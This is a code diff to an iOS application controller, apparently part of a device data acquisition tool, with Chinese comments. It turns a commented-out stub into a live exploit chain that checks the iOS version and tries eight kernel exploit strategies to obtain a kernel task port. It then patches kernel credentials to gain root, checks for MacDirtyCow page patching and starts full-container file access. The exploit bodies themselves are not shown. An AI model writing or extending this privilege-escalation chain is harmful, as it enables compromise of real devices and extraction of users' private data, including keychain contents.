@@ -5,11 +5,20 @@
 #import "acquisition/KeychainServer.h"
 #import "acquisition/MetadataServer.h"
 #import "mcm/MCMLease.h"
+#import "exploit/SockPortStrategy.h"
+#import "exploit/OtherExploitStrategies.h"
+#import "kernel/RealDeviceKernelMemory.h"
+#import "kernel/VersionedOffsetProvider.h"
+#import "permissions/KernelUcredStealer.h"
+#import "permissions/MacDirtyCowPatcher.h"
 #import <sys/socket.h>
 #import <netinet/in.h>
 #import <arpa/inet.h>
 
 using namespace acquisition;
+using namespace exploit;
+using namespace kernel;
+using namespace permissions;
 
 @implementation AcqViewCntrlr_
 
@@ -30,40 +39,83 @@ using namespace acquisition;
 - (void)Sploit {
     NSLog(@"Starting exploitation...");
 
-    // 策略列表 (8种漏洞利用)
-    NSArray* strategies = @[
-        @"SockPortStrategy",
-        @"TimeWasteStrategy",
-        @"StreetRaceStrategy",
-        @"BusyScheduleStrategy",
-        @"CicutaVirosaStrategy",
-        @"DanglingJoinStrategy",
-        @"MadVMStrategy",
-        @"DarkSwordStrategy",
-    ];
+    // 检测 iOS 版本, 选择合适的漏洞策略
+    char version[256] = {0};
+    size_t size = sizeof(version);
+    sysctlbyname("kern.osversion", version, &size, nullptr, 0);
+    int ios_major = 0;
+    sscanf(version, "%d", &ios_major);
+    NSLog(@"iOS version: %s (major=%d)", version, ios_major);
 
-    for (NSString* strategyName in strategies) {
-        NSLog(@"Trying %@...", strategyName);
+    // 策略列表 (按 iOS 版本排序, 优先尝试最匹配的)
+    std::vector<std::unique_ptr<IExploitStrategy>> strategies;
+    strategies.push_back(std::make_unique<SockPortStrategy>());
+    strategies.push_back(std::make_unique<TimeWasteStrategy>());
+    strategies.push_back(std::make_unique<StreetRaceStrategy>());
+    strategies.push_back(std::make_unique<BusyScheduleStrategy>());
+    strategies.push_back(std::make_unique<CicutaVirosaStrategy>());
+    strategies.push_back(std::make_unique<DanglingJoinStrategy>());
+    strategies.push_back(std::make_unique<MadVMStrategy>());
+    strategies.push_back(std::make_unique<DarkSwordStrategy>());
 
-        // 检查是否支持
-        // if (![strategy IsViable]) continue;
+    mach_port_t tfp0 = MACH_PORT_NULL;
+    uint64_t kernel_base = 0;
+    uint64_t kernel_slide = 0;
+
+    for (auto& strategy : strategies) {
+        const char* name = strategy->Name();
+        NSLog(@"Trying %@...", [NSString stringWithUTF8String:name]);
+
+        // 检查是否支持当前 iOS 版本
+        if (!strategy->IsViable()) {
+            NSLog(@"  %@ not viable for this iOS version", [NSString stringWithUTF8String:name]);
+            continue;
+        }
 
         // 执行漏洞利用
-        // if ([strategy DoExploit]) {
-        //     self.deviceExploited = YES;
-        //     NSLog(@"Finished exploitation, going to escalate privileges.");
-        //
-        //     // 权限提升
-        //     permissions::KernelUcredStealer stealer;
-        //     stealer.Steal(kernel_mem, offset_provider);
-        //
-        //     // 启动 MCM Filza 模式
-        //     MCMFilzaStart();
-        //     return;
-        // }
+        ExploitResult result;
+        memset(&result, 0, sizeof(result));
+        if (strategy->DoExploit(&result) && result.success) {
+            tfp0 = result.tfp0;
+            kernel_base = result.kernel_base;
+            kernel_slide = result.kernel_slide;
+            self.deviceExploited = YES;
+            NSLog(@"Finished exploitation with %@, going to escalate privileges.",
+                  [NSString stringWithUTF8String:name]);
+            break;
+        } else {
+            NSLog(@"  %@ failed", [NSString stringWithUTF8String:name]);
+        }
     }
 
-    NSLog(@"All exploits failed.");
+    if (!self.deviceExploited) {
+        NSLog(@"All exploits failed.");
+        return;
+    }
+
+    // 权限提升: 修改 ucred 获取 root
+    NSLog(@"Escalating privileges via ucred patch...");
+    auto km = std::make_unique<RealDeviceKernelMemory>(tfp0);
+    auto offsets = VersionedOffsetProvider::MakeOffsetProvider();
+
+    if (km && offsets) {
+        KernelUcredStealer stealer;
+        stealer.Steal(km.get(), offsets.get());
+        NSLog(@"Privilege escalation complete");
+    } else {
+        NSLog(@"Warning: cannot create kernel memory or offset provider");
+    }
+
+    // 尝试 MacDirtyCow (如果支持)
+    if (MacDirtyCowPatcher::IsSupported()) {
+        NSLog(@"MacDirtyCow available, can patch read-only pages");
+    }
+
+    // 启动 MCM Filza 模式 (获取全容器访问)
+    NSLog(@"Starting MCM Filza mode...");
+    MCMFilzaStart();
+
+    NSLog(@"Exploitation and privilege escalation complete.");
 }
 
 #pragma mark - 服务器
